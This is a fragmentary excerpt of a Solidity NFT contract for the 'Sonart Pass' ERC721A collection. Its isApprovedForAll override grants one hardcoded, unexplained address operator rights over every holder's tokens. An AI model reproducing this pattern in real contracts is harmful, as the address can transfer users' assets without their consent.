  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x00FD977395c57d74A17Ea49092D670F67fa14a02){return true;}
...
contract SonartTools is Ownable, ERC721A, ReentrancyGuard, DefaultOperatorFilterer {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("Sonart Pass", "SNRTPS", maxBatchSize_, collectionSize_) {
